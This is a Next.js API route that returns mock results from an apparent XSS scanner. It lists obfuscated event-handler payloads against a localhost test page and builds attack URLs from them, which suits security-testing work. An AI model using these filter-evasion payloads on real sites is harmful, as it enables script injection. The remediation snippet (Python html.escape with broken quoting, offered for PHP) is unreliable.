// Next.js API route support: https://nextjs.org/docs/api-routes/introduction



export default function handler(req, res) {
  
    if (req.method === 'GET') {
  
  
      // get param from url ?target_url
      //const target_url = req.query.target_url;
      let result = [
        {
            "list_vulnerability": [
                {
                    "corrections": {
                        "explanation_xss": "An XSS attack, or Cross-Site Scripting, is a type of computer attack where a hacker injects malicious code, usually JavaScript, into a website. This code is then executed on the browsers of users visiting the compromised site, enabling the hacker to steal personal information, take control of user accounts, or redirect users to malicious sites. XSS attacks exploit vulnerabilities in web applications, often by manipulating input fields or other interactive fields.",
                        "line_vuln": "file : C:\\wamp64\\www\\site-test\\pages\\xss.php line : 40 \n        <input type=\"text\" id=\"title\" name=\"title\" required><br><br>",
                        "list_corrections": [
                            {
                                "correction_explanation": "In your line of code, there is an opportunity for a user to insert malicious code. To prevent this threat, we recommend using the escape() function, which escapes malicious special characters. Applying this security measure ensures that user input is processed securely, minimising the risk of malicious code being injected into the system.",
                                "line_correction": "import html \nescaped_string = html.escape('<script>alert('Hello')</script>')\nprint(escaped_string)",
                                "title": "Correction Escape the Output"
                            }
                        ]
                    },
                    "parameter": "title",
                    "payloads": [
                        {
                            "payload": "<d3v onmouseover = [8].find(confirm)  >v3dm0s"
                        },
                        {
                            "payload": "<d3v onmouseover = a=prompt,a()  >v3dm0s"
                        },
                        {
                            "payload": "<a onpointerenter = confirm()>v3dm0s"
                        },
                        {
                            "payload": "<details ontoggle = (prompt)``>"
                        },
                        {
                            "payload": "<a onpointerenter = (prompt)``>v3dm0s"
                        },
                        {
                            "payload": "<a onpointerenter = (prompt)``  >v3dm0s"
                        },
                        {
                            "payload": "<details ontoggle = confirm()  //"
                        },
                        {
                            "payload": "<d3v onpointerenter = a=prompt,a()  >v3dm0s"
                        },
                        {
                            "payload": "<html onpointerenter = confirm()  >"
                        },
                        {
                            "payload": "<d3v onmouseover = confirm()  >v3dm0s"
                        },
                        {
                            "payload": "<d3v onmouseover = confirm()>v3dm0s"
                        },
                        {
                            "payload": "<a onmouseover = (prompt)``>v3dm0s"
                        },
                        {
                            "payload": "<details ontoggle = (confirm)()  >"
                        },
                        {
                            "payload": "<a onpointerenter = a=prompt,a()  >v3dm0s"
                        },
                        {
                            "payload": "<html onmouseover = a=prompt,a()>"
                        },
                        {
                            "payload": "<details ontoggle = a=prompt,a()  >"
                        }
                    ]
                },
                {
                    "corrections": {
                        "explanation_xss": "An XSS attack, or Cross-Site Scripting, is a type of computer attack where a hacker injects malicious code, usually JavaScript, into a website. This code is then executed on the browsers of users visiting the compromised site, enabling the hacker to steal personal information, take control of user accounts, or redirect users to malicious sites. XSS attacks exploit vulnerabilities in web applications, often by manipulating input fields or other interactive fields.",
                        "line_vuln": "file : C:\\wamp64\\www\\site-test\\pages\\xss.php line : 43 \n        <textarea id=\"content\" name=\"content\" rows=\"5\" cols=\"40\" required></textarea><br><br>",
                        "list_corrections": [
                            {
                                "correction_explanation": "In your line of code, there is an opportunity for a user to insert malicious code. To prevent this threat, we recommend using the escape() function, which escapes malicious special characters. Applying this security measure ensures that user input is processed securely, minimising the risk of malicious code being injected into the system.",
                                "line_correction": "import html \nescaped_string = html.escape('<script>alert('Hello')</script>')\nprint(escaped_string)",
                                "title": "Correction Escape the Output"
                            }
                        ]
                    },
                    "parameter": "content",
                    "payloads": [
                        {
                            "payload": "<details onpointerenter = [8].find(confirm)//"
                        },
                        {
                            "payload": "<d3v onmouseover = (confirm)()>v3dm0s"
                        },
                        {
                            "payload": "<html onmouseover = confirm()>"
                        },
                        {
                            "payload": "<details ontoggle = a=prompt,a()  >"
                        },
                        {
                            "payload": "<d3v onmouseover = [8].find(confirm)>v3dm0s"
                        },
                        {
                            "payload": "<details ontoggle = [8].find(confirm)  >"
                        },
                        {
                            "payload": "<a onpointerenter = confirm()  >v3dm0s"
                        },
                        {
                            "payload": "<details ontoggle = (prompt)``>"
                        },
                        {
                            "payload": "<html onmouseover = [8].find(confirm)//"
                        },
                        {
                            "payload": "<a onpointerenter = a=prompt,a()>v3dm0s"
                        },
                        {
                            "payload": "<d3v onpointerenter = (confirm)()>v3dm0s"
                        },
                        {
                            "payload": "<details ontoggle = (prompt)``//"
                        },
                        {
                            "payload": "<html onpointerenter = [8].find(confirm)  //"
                        },
                        {
                            "payload": "<html onpointerenter = confirm()  >"
                        },
                        {
                            "payload": "<html onpointerenter = (prompt)``  >"
                        },
                        {
                            "payload": "<details onpointerenter = (prompt)``>"
                        }
                    ]
                }
            ],
            "url": "http://localhost/site-test/pages/xss"
        }
    ]
  
      
   function FilterXSS(result) {
  
      var XSSLogs = []

      var current_time = new Date().getTime()
  
      try{
  
        // loop all payloads and add them into XSSLogs with a dict format
  
        for (var i = 0; i < result.length; i++) {
            
            for (var j = 0; j < result[i].list_vulnerability.length; j++) {
    
              for (var k = 0; k < result[i].list_vulnerability[j].payloads.length; k++) {
    
                XSSLogs.push({
                  "target_url": result[i].url + "?" + result[i].list_vulnerability[j].parameter + "=" + result[i].list_vulnerability[j].payloads[k].payload,
                  "AttackType": "xss",
                  "payload": result[i].list_vulnerability[j].payloads[k].payload,
                  "Success": true,
                  "corrections": result[i].list_vulnerability[j].corrections,
                    "time": current_time
                })
    
              }
    
            }
    
          }
        
  
      }
      catch(err){
  
        console.log(err)
  
      }
  
      return XSSLogs
  
  }
  
  console.log(FilterXSS(result))
      
      res.status(200).json(FilterXSS(result))
  
  
  
        
  
    }
  
  }
  